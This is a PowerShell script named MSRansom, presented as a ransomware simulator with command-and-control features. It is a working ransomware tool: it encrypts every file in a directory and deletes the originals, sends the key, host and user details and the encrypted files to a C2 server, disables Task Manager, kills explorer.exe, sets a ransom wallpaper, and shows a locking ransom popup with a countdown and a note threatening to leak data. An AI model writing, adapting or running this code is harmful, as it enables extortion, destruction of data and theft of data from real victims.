function MSRansom
{

# Design
$ProgressPreference = "SilentlyContinue"
$ErrorActionPreference = "SilentlyContinue"
$OSVersion = [Environment]::OSVersion.Platform
if ($OSVersion -like "*Win*") {
$Host.UI.RawUI.WindowTitle = "MSiRiG Ransomware Alert"
}

# Banner
function Show-Banner {
    
  Write-Host @"
  __  __     _ _____  _         _____                                 
 |  \/  |   (_)  __ \(_)       |  __ \                                
 | \  / |___ _| |__) |_  __ _  | |__) |__ _ _ __  ___  ___  _ __ ___  
 | |\/| / __| |  _  /| |/ _  | |  _  // _' | '_ \/ __|/ _ \| '_ ' _ \ 
 | |  | \__ \ | | \ \| | (_| | | | \ \ (_| | | | \__ \ (_) | | | | | |
 |_|  |_|___/_|_|  \_\_|\__, | |_|  \_\__,_|_| |_|___/\___/|_| |_| |_|
                         __/ |                                        
                        |___/                                         

------------------------------ by @dGiri -----------------------------
"@ -ForegroundColor Cyan  
     }

# Help
function Show-Help {
    Write-host ; Write-Host " Info: " -ForegroundColor Yellow -NoNewLine ; Write-Host " This tool helps you simulate encryption process of a"
    Write-Host "         generic ransomware in PowerShell with C2 capabilities"
    Write-Host ; Write-Host " Usage: " -ForegroundColor Yellow -NoNewLine ; Write-Host ".\MSRansom.ps1 -e Directory -s C2Server -p C2Port" -ForegroundColor DarkCyan
    Write-Host ; Write-Host " Usage: " -ForegroundColor Yellow -NoNewLine ; Write-Host ".\MSRansom.ps1 -e C:\Users\VMAdmin\Desktop\Hackme -s 172.24.153.145 -p 80 -x -Attack" -ForegroundColor DarkCyan
    Write-Host "           Encrypt all files & sends recovery key to C2Server" -ForegroundColor Green
    Write-Host "           Use -x to exfiltrate and decrypt files on C2Server" -ForegroundColor Green
    Write-Host ; Write-Host "         .\MSRansom.ps1 -d Directory -k RecoveryKey" -ForegroundColor DarkCyan
    Write-Host "           Decrypt all files with recovery key string" -ForegroundColor Green
    Write-Host ; Write-Host " Warning: " -ForegroundColor Red -NoNewLine  ; Write-Host "All info will be sent to the C2Server without any encryption"
    Write-Host "           " -NoNewLine ; Write-Host " You need previously generated recovery key to retrieve files" ; Write-Host }

# Variables
$Mode = $args[0]
$Directory = $args[1]
$PSRKey = $args[3]
$C2Server = $args[3]
$C2Port = $args[5]
$Exfil = $args[6]
$C2Status = $null
$Global:KeyCorrect = $false # Initialize Global:KeyCorrect

# Generate a unique payment ID for this session
$script:UniquePaymentID = (New-Guid).ToString().Replace("-", "")

# Errors
if ($args[0] -like "-h*") { Show-Banner ; Show-Help ; break }
if ($args[0] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
if ($args[1] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
if ($args[2] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
if ($args[3] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }

# Proxy Aware
[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()
[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
$AllProtocols = [System.Net.SecurityProtocolType]"Ssl3,Tls,Tls11,Tls12" ; [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols

# Functions
$computer = ([Environment]::MachineName).ToLower() ; $user = ([Environment]::UserName).ToLower() ; $Readme = "readme.txt"
$Time = Get-Date -Format "HH:mm - dd/MM/yy" ; $TMKey = $time.replace(":","").replace(" ","").replace("-","").replace("/","")+$computer
if ($OSVersion -like "*Win*") { $domain = (([Environment]::UserDomainName).ToLower()+"\") ; $slash = "\" } else { $domain = $null ; $slash = "/" }
$DirectoryTarget = $Directory.Split($slash)[-1] ; if (!$DirectoryTarget) { $DirectoryTarget = $Directory.Path.Split($slash)[-1] }

function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param(
        [Parameter(Mandatory = $true)]
        [ValidateSet("Encrypt", "Decrypt")]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path)

    Begin {
      $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
      $aesManaged = New-Object System.Security.Cryptography.AesManaged
      $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
      $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
      $aesManaged.BlockSize = 128
      $aesManaged.KeySize = 256
    }

    Process {
      $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
      switch ($Mode) {

          "Encrypt" {
              if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}

              if ($Path) {
                $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                if (!$File.FullName) { break }
                $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                $outPath = $File.FullName + ".msirig"
              }

              $encryptor = $aesManaged.CreateEncryptor()
              $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
              $encryptedBytes = $aesManaged.IV + $encryptedBytes
              $aesManaged.Dispose()

              if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
              if ($Path) {
                [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
              }
          }

          "Decrypt" {
              if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}

              if ($Path) {
                $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                if (!$File.FullName) { break }
                $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                $outPath = $File.FullName.replace(".msirig","")
              }

              $aesManaged.IV = $cipherBytes[0..15]
              $decryptor = $aesManaged.CreateDecryptor()
              $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
              $aesManaged.Dispose()

              if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
              if ($Path) {
                [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
              }
          }
      } # End of switch
    } # End of Process block

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
} # End of function Invoke-AESEncryption

# New function to set wallpaper
function Set-RansomWallpaper {
    Param(
        [Parameter(Mandatory=$true)]
        [string]$WallpaperUrl,
        [Parameter(Mandatory=$true)]
        [string]$DestinationPath
    )

    Write-Host "[+] Downloading and setting new wallpaper..." -ForegroundColor DarkCyan
    Try {
        Invoke-WebRequest -Uri $WallpaperUrl -OutFile $DestinationPath -ErrorAction Stop
        
        # Define constants for SystemParametersInfo
        $SPI_SETDESKWALLPAPER = 0x14 # 20
        $SPIF_UPDATEINIFILE = 0x01   # Write to Win.ini
        $SPIF_SENDCHANGE = 0x02      # Send WM_SETTINGCHANGE message

        # Add Type for P/Invoke to call SystemParametersInfo
        $signature = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
'@
        Add-Type -MemberDefinition $signature -Name "User32" -Namespace "Win32" -PassThru | Out-Null # Out-Null to suppress output

        # Call SystemParametersInfo to set the wallpaper
        $result = [Win32.User32]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $DestinationPath, $SPIF_UPDATEINIFILE -bor $SPIF_SENDCHANGE)

        if ($result -ne 0) {
            Write-Host "[i] Wallpaper set successfully." -ForegroundColor Green
        } else {
            Write-Host "[!] Failed to set wallpaper. Error code: $($LASTEXITCODE)" -ForegroundColor Red
        }
    }
    Catch {
        Write-Host "[!] Error downloading or setting wallpaper: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# New function to disable and restore explorer.exe auto-restart
function Disable-ExplorerAutoRestart {
    Param(
        [Parameter(Mandatory=$true)]
        [ValidateSet("Disable", "Restore")]
        [String]$Action
    )

    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    $regName = "AutoRestartShell"
    
    if ($Action -eq "Disable") {
        Write-Host "[+] Disabling automatic restart of explorer.exe..." -ForegroundColor DarkCyan
        Try {
            # Store the original value
            $script:originalAutoRestart = (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue).$regName
            Set-ItemProperty -Path $regPath -Name $regName -Value 0 -ErrorAction Stop
            Write-Host "[i] Automatic restart of explorer.exe disabled." -ForegroundColor Green
        }
        Catch {
            Write-Host "[!] Error disabling explorer.exe auto-restart: $($_.Exception.Message)" -ForegroundColor Red
        }
    }
    elseif ($Action -eq "Restore") {
        Write-Host "[+] Restoring automatic restart of explorer.exe..." -ForegroundColor DarkCyan
        Try {
            if ($null -ne $script:originalAutoRestart) {
                Set-ItemProperty -Path $regPath -Name $regName -Value $script:originalAutoRestart -ErrorAction Stop
            } else {
                Set-ItemProperty -Path $regPath -Name $regName -Value 1 -ErrorAction Stop
            }
            Write-Host "[i] Automatic restart of explorer.exe restored." -ForegroundColor Green
        }
        Catch {
            Write-Host "[!] Error restoring explorer.exe auto-restart: $($_.Exception.Message)" -ForegroundColor Red
        }
    }
}

# New function to disable and restore Task Manager
function Disable-TaskManager {
    Param(
        [Parameter(Mandatory=$true)]
        [ValidateSet("Disable", "Restore")]
        [String]$Action
    )

    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
    $regName = "DisableTaskMgr"
    
    if ($Action -eq "Disable") {
        Write-Host "[+] Disabling Task Manager..." -ForegroundColor DarkCyan
        Try {
            # Create the Policies\System key if it doesn't exist
            if (-not (Test-Path $regPath)) {
                New-Item -Path $regPath -Force | Out-Null
            }
            # Store the original value
            $script:originalTaskMgr = (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue).$regName
            Set-ItemProperty -Path $regPath -Name $regName -Value 1 -ErrorAction Stop
            Write-Host "[i] Task Manager disabled." -ForegroundColor Green
        }
        Catch {
            Write-Host "[!] Error disabling Task Manager: $($_.Exception.Message)" -ForegroundColor Red
        }
    }
    elseif ($Action -eq "Restore") {
        Write-Host "[+] Restoring Task Manager..." -ForegroundColor DarkCyan
        Try {
            if ($null -ne $script:originalTaskMgr) {
                Set-ItemProperty -Path $regPath -Name $regName -Value $script:originalTaskMgr -ErrorAction Stop
            } else {
                Remove-ItemProperty -Path $regPath -Name $regName -ErrorAction Stop
            }
            Write-Host "[i] Task Manager restored." -ForegroundColor Green
        }
        Catch {
            Write-Host "[!] Error restoring Task Manager: $($_.Exception.Message)" -ForegroundColor Red
        }
    }
}

# Modified function to kill explorer.exe with 3 beep sounds
function Stop-Explorer {
    Write-Host "[+] Terminating explorer.exe..." -ForegroundColor DarkCyan
    Try {
        Stop-Process -Name "explorer" -Force -ErrorAction Stop
        # Play 3 beep sounds
        for ($i = 0; $i -lt 3; $i++) {
            [Console]::Beep(1000, 500)
            Start-Sleep -Milliseconds 200 # Short pause between beeps
        }
        Write-Host "[i] explorer.exe terminated successfully." -ForegroundColor Green
    }
    Catch {
        Write-Host "[!] Error terminating explorer.exe: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Modified function to show ransom popup with 2 beep sounds
function PopUpRansom {
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
[void] [System.Windows.Forms.Application]::EnableVisualStyles()

$shell = New-Object -ComObject "Shell.Application"
$shell.minimizeall()

# Create main form with larger size
$form = New-Object system.Windows.Forms.Form
$form.ControlBox = $false
$form.Size = New-Object System.Drawing.Size(800,600)
$form.BackColor = [System.Drawing.Color]::Black
$form.MaximizeBox = $false
$form.StartPosition = "CenterScreen"
$form.WindowState = "Normal"
$form.Topmost = $true
$form.FormBorderStyle = "FixedSingle"
$form.Text = "MSiRig Ransomware Alert"

# Create skull and crossbones ASCII art (simplified)
$skullLabel = New-Object System.Windows.Forms.Label
$skullLabel.ForeColor = [System.Drawing.Color]::Red
$skullLabel.BackColor = [System.Drawing.Color]::Black
$skullLabel.Text = @"
    ☠️ ALL YOUR FILES ARE ENCRYPTED! ☠️
   
    Your documents, photos, databases, and other
    important files have been encrypted with strong
    encryption. Without the decryption key,
    your files are inaccessible
    and will be LEAKED if payment is not received!.
"@
$skullLabel.Font = New-Object System.Drawing.Font("Consolas",14,[System.Drawing.FontStyle]::Bold)
$skullLabel.AutoSize = $false
$skullLabel.Size = New-Object System.Drawing.Size(760,180)
$skullLabel.Location = New-Object System.Drawing.Point(20,20)
$skullLabel.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
$form.Controls.Add($skullLabel)

# Instruction label
$instructionLabel = New-Object System.Windows.Forms.Label
$instructionLabel.ForeColor = [System.Drawing.Color]::White
$instructionLabel.BackColor = [System.Drawing.Color]::Black
$instructionLabel.Text = "To recover your files, you need to obtain the decryption key."
$instructionLabel.Font = New-Object System.Drawing.Font("Consolas",12,[System.Drawing.FontStyle]::Regular)
$instructionLabel.AutoSize = $false
$instructionLabel.Size = New-Object System.Drawing.Size(760,30)
$instructionLabel.Location = New-Object System.Drawing.Point(20,220)
$instructionLabel.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
$form.Controls.Add($instructionLabel)

# Timer label
$timerLabel = New-Object System.Windows.Forms.Label
$timerLabel.ForeColor = [System.Drawing.Color]::Yellow
$timerLabel.BackColor = [System.Drawing.Color]::Black
$timerLabel.Text = "Time remaining: 6 hours 00 minutes 00 seconds"
$timerLabel.Font = New-Object System.Drawing.Font("Consolas",12,[System.Drawing.FontStyle]::Bold)
$timerLabel.AutoSize = $false
$timerLabel.Size = New-Object System.Drawing.Size(760,30)
$timerLabel.Location = New-Object System.Drawing.Point(20,250)
$timerLabel.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
$form.Controls.Add($timerLabel)

# Key input textbox
$keyTextbox = New-Object System.Windows.Forms.TextBox
$keyTextbox.Location = New-Object System.Drawing.Point(150,290)
$keyTextbox.Size = New-Object System.Drawing.Size(500,30)
$keyTextbox.Font = New-Object System.Drawing.Font("Consolas",12)
$keyTextbox.BackColor = [System.Drawing.Color]::DarkGray
$keyTextbox.ForeColor = [System.Drawing.Color]::Black
$keyTextbox.TextAlign = [System.Windows.Forms.HorizontalAlignment]::Center
$form.Controls.Add($keyTextbox)

# Unlock button
$unlockButton = New-Object System.Windows.Forms.Button
$unlockButton.Location = New-Object System.Drawing.Point(330,330)
$unlockButton.Size = New-Object System.Drawing.Size(140,30)
$unlockButton.Text = 'DECRYPT FILES'
$unlockButton.ForeColor = [System.Drawing.Color]::White
$unlockButton.BackColor = [System.Drawing.Color]::DarkRed
$unlockButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$unlockButton.Font = New-Object System.Drawing.Font("Consolas",10,[System.Drawing.FontStyle]::Bold)
$unlockButton.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
$form.Controls.Add($unlockButton)

# Status label
$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.ForeColor = [System.Drawing.Color]::Yellow
$statusLabel.BackColor = [System.Drawing.Color]::Black
$statusLabel.Text = "Status: Waiting for decryption key or payment..."
$statusLabel.Font = New-Object System.Drawing.Font("Consolas",10,[System.Drawing.FontStyle]::Regular)
$statusLabel.AutoSize = $false
$statusLabel.Size = New-Object System.Drawing.Size(760,30)
$statusLabel.Location = New-Object System.Drawing.Point(20,370)
$statusLabel.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
$form.Controls.Add($statusLabel)

# PAY NOW button
$payButton = New-Object System.Windows.Forms.Button
$payButton.Location = New-Object System.Drawing.Point(330,430)
$payButton.Size = New-Object System.Drawing.Size(140,35)
$payButton.Text = 'PAY NOW'
$payButton.ForeColor = [System.Drawing.Color]::White
$payButton.BackColor = [System.Drawing.Color]::DarkGreen
$payButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$payButton.Font = New-Object System.Drawing.Font("Consolas",10,[System.Drawing.FontStyle]::Bold)
$payButton.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
$form.Controls.Add($payButton)

# Timer logic for ransomware countdown
$deadline = (Get-Date).AddHours(6) # 6-hour countdown
$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 1000 # Update every second
$timer.Add_Tick({
    $timeLeft = $deadline - (Get-Date)
    if ($timeLeft.TotalSeconds -gt 0) {
        $hours = [Math]::Floor($timeLeft.TotalHours)
        $minutes = $timeLeft.Minutes
        $seconds = $timeLeft.Seconds
        $timerLabel.Text = "Time remaining: $hours hours $minutes minutes $seconds seconds"
    } else {
        $timerLabel.Text = "Time expired! Files may be deleted or ransom doubled."
        $timerLabel.ForeColor = [System.Drawing.Color]::Red
        $timer.Stop()
    }
})

# Timer for delayed explorer.exe termination
$explorerTimer = New-Object System.Windows.Forms.Timer
$explorerTimer.Interval = 25000 # 25 seconds
$explorerTimer.Add_Tick({
    Disable-ExplorerAutoRestart -Action Disable
    Stop-Explorer
    $explorerTimer.Stop()
    $explorerTimer.Dispose()
})

# Event handlers
$unlockButton.add_Click({
    $enteredKey = $keyTextbox.Text
    if ($enteredKey -eq $PSRKey) {
        $statusLabel.Text = "Status: Decryption successful! Files are being restored."
        $statusLabel.ForeColor = [System.Drawing.Color]::Green
        $Global:KeyCorrect = $true
        $timer.Stop()
        $explorerTimer.Stop()
        # Create a timer to close the form after 2 seconds
        $closeTimer = New-Object System.Windows.Forms.Timer
        $closeTimer.Interval = 2000 # 2 seconds
        $closeTimer.Add_Tick({
            $form.Close()
            $closeTimer.Stop()
            $closeTimer.Dispose()
        })
        $closeTimer.Start()
    } else {
        $statusLabel.Text = "Status: Incorrect key! Files remain encrypted."
        $statusLabel.ForeColor = [System.Drawing.Color]::Red
        $Global:KeyCorrect = $false
    }
})

$payButton.add_Click({
    $paymentURL = "http://bitcoin.com/pay/$script:UniquePaymentID"
    Start-Process $paymentURL # Open the URL in default browser
    $statusLabel.Text = "Status: Redirecting to payment portal... Please follow instructions on the new page."
    $statusLabel.ForeColor = [System.Drawing.Color]::Orange
    # The form does not close immediately, giving the impression of external action.
})

# Handle Enter key in textbox
$keyTextbox.add_KeyDown({
    if ($_.KeyCode -eq "Enter") {
        $unlockButton.PerformClick()
    }
})

# Cleanup on form close
$form.Add_Closing({
    $timer.Stop()
    $timer.Dispose()
    $explorerTimer.Stop()
    $explorerTimer.Dispose()
    Disable-ExplorerAutoRestart -Action Restore
    Disable-TaskManager -Action Restore
    # Restart explorer.exe
    Write-Host "[+] Restarting explorer.exe..." -ForegroundColor DarkCyan
    Try {
        Start-Process explorer.exe -ErrorAction Stop
        Write-Host "[i] explorer.exe restarted successfully." -ForegroundColor Green
    }
    Catch {
        Write-Host "[!] Error restarting explorer.exe: $($_.Exception.Message)" -ForegroundColor Red
    }
})

# Modified to add 2 beeps when the form is shown
$form.Add_Shown({
    $keyTextbox.Focus()
    # Play 2 beep sounds
    for ($i = 0; $i -lt 2; $i++) {
        [Console]::Beep(1000, 500)
        Start-Sleep -Milliseconds 200 # Short pause between beeps
    }
    # Start the ransomware countdown timer
    Write-Host "[+] Starting ransomware countdown timer..." -ForegroundColor DarkCyan
    $timer.Start()
    # Disable Task Manager after popup is shown
    Disable-TaskManager -Action Disable
    # Start the explorer termination timer
    $explorerTimer.Start()
})

$result = $form.ShowDialog()

return $Global:KeyCorrect
}

function R64Encoder {
    if ($args[0] -eq "-t") { $base64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($args[1])) }
    if ($args[0] -eq "-f") { $base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($args[1])) }
    $base64 = $base64.Split("=")[0] ; $base64 = $base64.Replace("+", "-") ; $base64 = $base64.Replace("/", "_")
    $revb64 = $base64.ToCharArray() ; [array]::Reverse($revb64) ; $R64Base = -join $revb64 ; return $R64Base }

function ShowInfo {
    Write-Host ; Write-Host "[>] Hostname: " -NoNewLine -ForegroundColor Yellow ; Write-Host $computer
    Write-Host "[>] Current User: " -NoNewLine -ForegroundColor Yellow ; Write-Host $domain$user
    Write-Host "[>] Current Time: " -NoNewLine -ForegroundColor Yellow ; Write-Host $time }

function GetStatus {
    Try { Invoke-WebRequest -useb "$C2Server`:$C2Port/status" -Method GET
      Write-Host "[i] Command & Control Server is up!" -ForegroundColor Green ; return $true } # Return true if C2 is up
    Catch { Write-Host "[!] Command & Control Server is down!" -ForegroundColor Red ; return $false }} # Return false if C2 is down

function SendResults {
    $DESKey = Invoke-AESEncryption -Mode Encrypt -Key $TMKey -Text $PSRKey ; $B64Key = R64Encoder -t $DESKey
    $C2Data = " [>] Key: $B64Key [>] Hostname: $computer [>] Current User: $domain$user [>] Current Time: $time"
    $RansomLogs = Get-Content "$Directory$slash$Readme" | Where-Object { $_ -match "\[\!\] .* is now encrypted" }
    $B64Data = R64Encoder -t $C2Data ; $B64Logs = R64Encoder -t ($RansomLogs -join "`n")
    Invoke-WebRequest -useb "$C2Server`:$C2Port/data" -Method POST -Body $B64Data 2>&1> $null
    Invoke-WebRequest -useb "$C2Server`:$C2Port/logs" -Method POST -Body $B64Logs 2>&1> $null }

function SendClose {
    Invoke-WebRequest -useb "$C2Server`:$C2Port/close" -Method GET 2>&1> $null }

function SendPay {
    Invoke-WebRequest -useb "$C2Server`:$C2Port/pay" -Method GET 2>&1> $null }

function SendOK {
    Invoke-WebRequest -useb "$C2Server`:$C2Port/done" -Method GET 2>&1> $null }

function CreateReadme {
    $ReadmeTXT = @"
All your files have been encrypted by MSiRig Ransomware! To recover them, you need the unique decryption key. If you are seeing this, your files are encrypted.

A. To obtain the decryption key, visit our payment portal: http://bitcoin.com/pay/$script:UniquePaymentID

B. Your unique ID for payment: $script:UniquePaymentID

C. Warning: Attempting to decrypt files with third-party tools may lead to irreversible data loss.

Failure to pay the ransom within 6 hours may result in permanent file deletion or a doubled ransom amount. We possess copies of sensitive data. Failure to pay could lead to its public release. 

Don't waste time, your data is at risk. Act quickly!"

D. Files Encrypted:
"@
    if (!(Test-Path "$Directory$slash$Readme")) {
        Add-Content -Path "$Directory$slash$Readme" -Value $ReadmeTXT
    }
}

function EncryptFiles {
    $ExcludedFiles = '*.msirig', 'readme.txt', '*.dll', '*.ini', '*.sys', '*.exe', '*.msi', '*.NLS', '*.acm', '*.nls', '*.EXE', '*.dat', '*.efi', '*.mui'
    foreach ($i in $(Get-ChildItem $Directory -recurse -exclude $ExcludedFiles | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
    Invoke-AESEncryption -Mode Encrypt -Key $PSRKey -Path $i ; Add-Content -Path "$Directory$slash$Readme" -Value "[!] $i is now encrypted" ; Remove-Item $i }
    $RansomLogs = Get-Content "$Directory$slash$Readme" | Where-Object { $_ -match "\[\!\] .* is now encrypted" } ; if (!$RansomLogs) {
    Add-Content -Path "$Directory$slash$Readme" -Value "[!] No files have been encrypted!" }}

function ExfiltrateFiles {
    Invoke-WebRequest -useb "$C2Server`:$C2Port/files" -Method GET 2>&1> $null
    $RansomLogs = Get-Content "$Directory$slash$Readme" | Where-Object { $_ -match "\[\!\] No files have been encrypted!" } ; if (!$RansomLogs) {
    foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.msirig | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
      $Pfile = $i.split($slash)[-1] ; $B64file = R64Encoder -f $i ; $B64Name = R64Encoder -t $Pfile
      Invoke-WebRequest -useb "$C2Server`:$C2Port/files/$B64Name" -Method POST -Body $B64file 2>&1> $null }}
    else { $B64Name = R64Encoder -t "none.null" ; Invoke-WebRequest -useb "$C2Server`:$C2Port/files/$B64Name" -Method POST -Body $B64file 2>&1> $null }}

function DecryptFiles {
    foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.msirig | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
      Invoke-AESEncryption -Mode Decrypt -Key $PSRKey -Path $i ; $rfile = $i.replace(".msirig","")
      Write-Host "[+] $rfile is now decrypted" -ForegroundColor DarkCyan ; Remove-Item $i } ; Remove-Item "$Directory$slash$Readme" }

function CheckFiles {
    $RFiles = Get-ChildItem $Directory -recurse -filter *.msirig ; if ($RFiles) { $RFiles | Remove-Item } else {
    Write-Host "[!] No encrypted files have been found!" -ForegroundColor Red }}

# Main
Show-Banner ; ShowInfo

if ($Mode -eq "-d") {
    Write-Host ; Write-Host "[!] Attempting to recover files in $DirectoryTarget directory..." -ForegroundColor Red
    Write-Host "[i] Applying recovery key to encrypted files..." -ForegroundColor Green
    DecryptFiles ; CheckFiles
    # Restore explorer.exe auto-restart and Task Manager
    Disable-ExplorerAutoRestart -Action Restore
    Disable-TaskManager -Action Restore
    Try {
        Start-Process explorer.exe -ErrorAction Stop
        Write-Host "[i] explorer.exe restarted successfully." -ForegroundColor Green
    }
    Catch {
        Write-Host "[!] Error restarting explorer.exe: $($_.Exception.Message)" -ForegroundColor Red
    }
}
else {
    Write-Host ; Write-Host "[!] Initiating encryption on $DirectoryTarget directory..." -ForegroundColor Red
    Write-Host "[+] Checking communication with Command & Control Server..." -ForegroundColor DarkCyan
    $C2Status = GetStatus

    Write-Host "[+] Generating a unique encryption key..." -ForegroundColor DarkCyan
    $PSRKey = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | % {[char]$_})

    Write-Host "[!] Encrypting all accessible files with 256-bit AES encryption..." -ForegroundColor Red
    CreateReadme ; EncryptFiles ;
    if ($C2Status) { SendResults }

    # Call the wallpaper function
    $wallpaperUrl = "https://raw.githubusercontent.com/IAMinZoho/MSRansom/refs/heads/main/Attack_Wallpaper.jpg"
    $wallpaperTempPath = Join-Path $env:TEMP "ransom_wallpaper_$script:UniquePaymentID.jpg"
    Set-RansomWallpaper -WallpaperUrl $wallpaperUrl -DestinationPath $wallpaperTempPath


    if ($Exfil -eq "-x") {
        Write-Host "[i] Exfiltrating encrypted files to Command & Control Server..." -ForegroundColor Green
        ExfiltrateFiles
    }

    if (!$C2Status) { Write-Host "[+] Saving logs and key locally in readme.txt..." -ForegroundColor DarkCyan }
    else { Write-Host "[+] Sending logs and key to Command & Control Server..." -ForegroundColor DarkCyan }


    if ($args -like "-Attack") {
        $unlockResult = PopUpRansom
        if ($unlockResult) {
            Write-Host "[+] Decryption key accepted. Initiating file recovery..." -ForegroundColor Green
            DecryptFiles
            SendOK
        } else {
            Write-Host "[!] Incorrect decryption key. Files remain encrypted." -ForegroundColor Red
            SendClose ; SendOK
        }
    } else {
        # Disable Task Manager and start explorer termination timer if not in Attack mode
        Disable-TaskManager -Action Disable
        Write-Host "[+] Delaying explorer.exe termination by 25 seconds..." -ForegroundColor DarkCyan
        Start-Sleep -Seconds 25
        Disable-ExplorerAutoRestart -Action Disable
        Stop-Explorer
        SendOK
    }
}

Write-Host "[i] Operation completed." -ForegroundColor Green
Write-Host

}